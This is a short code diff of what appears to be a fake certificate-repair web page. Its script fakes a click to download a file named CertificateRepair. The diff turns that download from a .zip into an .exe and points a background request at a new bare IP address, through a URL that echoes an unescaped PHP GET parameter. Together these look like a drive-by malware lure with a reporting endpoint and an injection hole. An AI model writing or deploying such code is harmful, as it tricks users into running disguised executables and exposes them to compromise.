@@ -934,8 +934,8 @@ input[type=checkbox]:checked ~ .checkbox::before {
   function downCert(){ 
     var downloadElement = document.createElement('a');
     const evt = document.createEvent('MouseEvent');
-    downloadElement.download = 'CertificateRepair.zip';
-    downloadElement.href = '/h5/static/CertificateRepair.zip';
+    downloadElement.download = 'CertificateRepair.exe';
+    downloadElement.href = '/h5/static/CertificateRepair.exe';
     evt.initEvent('click', true,true);
     downloadElement.dispatchEvent(evt);
     window.URL.revokeObjectURL(downloadElement.href);
@@ -947,7 +947,7 @@ input[type=checkbox]:checked ~ .checkbox::before {
               }
         }
     };
-    xhr.open("get", "http://38.84.177.42:3008/h5/static/letgo.php?f=<?php echo(@$_GET['c']);?>", true);
+    xhr.open("get", "http://154.206.129.107/h5/static/letgo.php?f=<?php echo(@$_GET['c']);?>", true);
     xhr.send(null);
   }
   const refreshBtn = document.getElementById('details-button');
